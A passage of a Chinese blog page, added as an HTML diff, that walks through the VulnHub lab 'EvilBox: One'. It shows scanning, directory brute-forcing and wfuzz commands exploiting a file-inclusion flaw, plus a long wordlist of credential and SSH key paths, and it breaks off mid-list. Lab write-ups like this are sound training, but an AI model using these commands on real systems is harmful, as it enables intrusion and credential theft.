@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EvilBox: One">
+<meta property="og:url" content="https://z9m8r8.github.io/2024/03/08/EvilBox%20One/index.html">
+<meta property="og:site_name" content="Ghost&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-03-08T10:10:51.000Z">
+<meta property="article:modified_time" content="2024-03-12T12:08:29.067Z">
+<meta property="article:author" content="Ghost">
+<meta property="article:tag" content="Vulnhub 靶场">
+<meta property="article:tag" content="信息收集">
+<meta property="article:tag" content="shell">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2024/03/08/EvilBox%20One/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/03/08/EvilBox%20One/","path":"2024/03/08/EvilBox One/","title":"EvilBox: One"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>EvilBox: One | Ghost's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Ghost's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.1. 主机探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">1.2. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.3. web 信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2. 渗透攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh-%E7%99%BB%E5%BD%95"><span class="nav-text">2.1. ssh 登录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">2.2. 提权</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ghost"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ghost</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">111</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">49</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/03/08/EvilBox%20One/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ghost">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ghost's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="EvilBox: One | Ghost's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          EvilBox: One
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-03-08 18:10:51" itemprop="dateCreated datePublished" datetime="2024-03-08T18:10:51+08:00">2024-03-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-03-12 20:08:29" itemprop="dateModified" datetime="2024-03-12T20:08:29+08:00">2024-03-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.7k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>6 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>靶机：<a
+target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/evilbox-one,736/">EvilBox: One ~
+VulnHub</a></p>
+</blockquote>
+<h2 id="信息收集">1. 信息收集</h2>
+<h3 id="主机探测">1.1. 主机探测</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081521939.png" /></p>
+<h3 id="端口扫描">1.2. 端口扫描</h3>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081522264.png" /></p>
+<p>对 22 尝试弱口令无果……继续 web 信息收集</p>
+<h3 id="web-信息收集">1.3. web 信息收集</h3>
+<p>目录遍历</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081524084.png" /></p>
+<p><code>http://192.168.159.134/robots.txt</code> 下看到个
+<code>Hello H4x0r</code> ，H4x0r 可能是个用户名</p>
+<p><code>(http://192.168.159.134/secret/</code>
+一片空白……再次尝试目录遍历，常规扫描不到结果时或许我们可以考虑多换几个字典试试，由于是做目录遍历也可指定我们猜测的可能后缀，示例如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.134/secret/&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -e php,html,txt -f</span><br></pre></td></tr></table></figure>
+<p>注，当不知道或看不懂命令时，我们或许更应该去查查，而不是简单的复制粘贴</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081616378.png" /></p>
+<p>扫到个 evil.php，访问依旧空白……陷入僵局……谷歌……evil.php
+存在文件包含漏洞，进一步模糊测试【以读取 /etc/passwd 为例】</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -Z -w /usr/share/wordlists/wfuzz/general/common.txt -w path_dic.txt -u <span class="string">&quot;http://192.168.159.134/secret/evil.php?FUZZ=FUZ2Zetc/passwd&quot;</span> --hw 0</span><br></pre></td></tr></table></figure>
+<p>注，FUZZ【字典 common.txt】，FUZ2Z【字典
+path_dic.txt】是表示多个测试位置，放在哪里就测试哪里。由于不知道
+evil.php 的路径，所以要成功读取 /etc/passwd 也要对其测试。--hw 0
+则是对响应按字数过滤下，</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081601212.png" /></p>
+<p>由结果得FUZZ=command，FUZ2Z=../../../../</p>
+<p>浏览器读取 /etc/passwd</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403081604594.png" /></p>
+<p>有个 mowree 用户，第一个 flag 估计就在该用户的目录下，直接尝试读取
+user.txt
+【/home/mowree/user.txt】无果……可能路径不对，也可能文件做了权限处理</p>
+<p>继续 FUZZ 系统文件【找个 Linux 敏感文件的字典折腾】</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -Z -w linux_file_dic.txt -u <span class="string">&quot;http://192.168.159.134/secret/evil.php?command=../../../..FUZZ&quot;</span> --hw 0 </span><br></pre></td></tr></table></figure>
+<p>linux_file_dic.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br></pre></td><td class="code"><pre><span class="line">/﻿﻿etc/httpd/conf/httpd.conf</span><br><span class="line">/~/.atftp_history</span><br><span class="line">/~/.bash_history</span><br><span class="line">/~/.bashrc</span><br><span class="line">/~/.mysql_history</span><br><span class="line">/~/.nano_history</span><br><span class="line">/~/.php_history</span><br><span class="line">/~/.profile</span><br><span class="line">/~/.ssh/authorized_keys</span><br><span class="line">/~/.ssh/id_dsa</span><br><span class="line">/~/.ssh/id_dsa.pub</span><br><span class="line">/~/.ssh/id_rsa</span><br><span class="line">/~/.ssh/id_rsa.pub</span><br><span class="line">/~/.ssh/identity</span><br><span class="line">/~/.ssh/identity.pub</span><br><span class="line">/~/.ssh/known_hosts</span><br><span class="line">/apache/apache/conf/httpd.conf</span><br><span class="line">/apache/apache2/conf/httpd.conf</span><br><span class="line">/apache/php/php.ini</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/etc/apache/apache.conf</span><br><span class="line">/etc/apache/httpd.conf</span><br><span class="line">/etc/apache2/apache.conf</span><br><span class="line">/etc/apache2/httpd.conf</span><br><span class="line">/etc/apache2/sites-available/default</span><br><span class="line">/etc/apache2/vhosts.d/00_default_vhost.conf</span><br><span class="line">/etc/at.allow</span><br><span class="line">/etc/at.deny</span><br><span class="line">/etc/bashrc</span><br><span class="line">/etc/cron.allow</span><br><span class="line">/etc/cron.deny</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/fstab</span><br><span class="line">/etc/group</span><br><span class="line">/etc/host.conf</span><br><span class="line">/etc/hosts</span><br><span class="line">/etc/hosts.deny</span><br><span class="line">/etc/httpd/conf.d/httpd.conf</span><br><span class="line">/etc/httpd/conf.d/php.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/httpd/htdocs/index.html</span><br><span class="line">/etc/httpd/htdocs/index.php</span><br><span class="line">/etc/httpd/httpd.conf</span><br><span class="line">/etc/httpd/logs/access.log</span><br><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/etc/httpd/logs/error.log</span><br><span class="line">/etc/httpd/logs/error_log</span><br><span class="line">/etc/httpd/php.ini</span><br><span class="line">/etc/init.d/httpd</span><br><span class="line">/etc/init.d/mysql</span><br><span class="line">/etc/inputrc</span><br><span class="line">/etc/issue</span><br><span class="line">/etc/issue/net</span><br><span class="line">/etc/ld.so.conf</span><br><span class="line">/etc/logrotate.conf</span><br><span class="line">/etc/motd</span><br><span class="line">/etc/my.cnf</span><br><span class="line">/etc/mysql/my.cnf</span><br><span class="line">/etc/network/interfaces</span><br><span class="line">/etc/networks</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/php.ini</span><br><span class="line">/etc/php/apache/php.ini</span><br><span class="line">/etc/php/apache2/php.ini</span><br><span class="line">/etc/php/cgi/php.ini</span><br><span class="line">/etc/php/php.ini</span><br><span class="line">/etc/php/php4/php.ini</span><br><span class="line">/etc/php4.4/fcgi/php.ini</span><br><span class="line">/etc/php4/apache/php.ini</span><br><span class="line">/etc/php4/apache2/php.ini</span><br><span class="line">/etc/php4/cgi/php.ini</span><br><span class="line">/etc/php5/apache/php.ini</span><br><span class="line">/etc/php5/apache2/php.ini</span><br><span class="line">/etc/php5/cgi/php.ini</span><br><span class="line">/etc/phpmyadmin/config.inc.php</span><br><span class="line">/etc/protocols</span><br><span class="line">/etc/rc.local</span><br><span class="line">/etc/redhat-release</span><br><span class="line">/etc/redis.conf</span><br><span class="line">/etc/resolv.conf</span><br><span class="line">/etc/shadow</span><br><span class="line">/etc/ssh/ssh_config</span><br><span class="line">/etc/ssh/ssh_host_dsa_key</span><br><span class="line">/etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">/etc/ssh/ssh_host_key</span><br><span class="line">/etc/ssh/ssh_host_key.pub</span><br><span class="line">/etc/ssh/ssh_host_rsa_key</span><br><span class="line">/etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">/etc/ssh/sshd_config</span><br><span class="line">/etc/syscomfig/network-scripts/ifcfg-eth1</span><br><span class="line">/etc/sysconfig/network</span><br><span class="line">/etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">/etc/termcap</span><br><span class="line">/etc/vsftpd/vsftpd.conf</span><br><span class="line">/etc/xinetd.conf</span><br><span class="line">/etc/xinetd.d</span><br><span class="line">/home/apache/conf/httpd.conf</span><br><span class="line">/home/apache2/conf/httpd.conf</span><br><span class="line">/home/bin/stable/apache/php.ini</span><br><span class="line">/home/httpd/conf/httpd.conf</span><br><span class="line">/home/root/.atftp_history</span><br><span class="line">/home/root/.bash_history</span><br><span class="line">/home/root/.bashrc</span><br><span class="line">/home/root/.mysql_history</span><br><span class="line">/home/root/.nano_history</span><br><span class="line">/home/root/.php_history</span><br><span class="line">/home/root/.profile</span><br><span class="line">/home/root/.ssh/authorized_keys</span><br><span class="line">/home/root/.ssh/id_dsa</span><br><span class="line">/home/root/.ssh/id_dsa.pub</span><br><span class="line">/home/root/.ssh/id_rsa</span><br><span class="line">/home/root/.ssh/id_rsa.pub</span><br><span class="line">/home/root/.ssh/identity</span><br><span class="line">/home/root/.ssh/identity.pub</span><br><span class="line">/home/root/anaconda-ks.cfg</span><br><span class="line">/home/mowree/.bash_history</span><br><span class="line">/home/mowree/.atftp_history</span><br><span class="line">/home/mowree/.bash_history</span><br><span class="line">/home/mowree/.bashrc</span><br><span class="line">/home/mowree/.mysql_history</span><br><span class="line">/home/mowree/.nano_history</span><br><span class="line">/home/mowree/.php_history</span><br><span class="line">/home/mowree/.profile</span><br><span class="line">/home/mowree/.ssh/authorized_keys</span><br><span class="line">/home/mowree/.ssh/id_dsa</span><br><span class="line">/home/mowree/.ssh/id_dsa.pub</span><br><span class="line">/home/mowree/.ssh/id_rsa</span><br><span class="line">/home/mowree/.ssh/id_rsa.pub</span><br><span class="line">/home/mowree/.ssh/identity</span><br><span class="line">/home/mowree/.ssh/identity.pub</span><br><span class="line">/home/mowree/anaconda-ks.cfg</span><br><span class="line">/home2/bin/stable/apache/php.ini</span><br><span class="line">/NetServer/bin/stable/apache/php.ini</span><br><span class="line">/opt/nginx/conf/nginx.conf</span><br><span class="line">/opt/www/conf/httpd.conf</span><br><span class="line">/opt/www/htdocs/index.html</span><br><span class="line">/opt/www/htdocs/index.php</span><br><span class="line">/opt/xampp/etc/php.ini</span><br><span class="line">/PHP/php.ini</span><br><span class="line">/php4/php.ini</span><br><span class="line">/php5/php.ini</span><br><span class="line">/porc/config.gz</span><br><span class="line">/porc/self/cmdline</span><br><span class="line">/private/var/log/apache2/access_log</span><br><span class="line">/private/var/log/apache2/error_log</span><br><span class="line">/proc/cmdline</span><br><span class="line">/proc/config.gz</span><br><span class="line">/proc/mounts</span><br><span class="line">/proc/net/arp</span><br><span class="line">/proc/net/dev</span><br><span class="line">/proc/net/fib_trie</span><br><span class="line">/proc/net/route</span><br><span 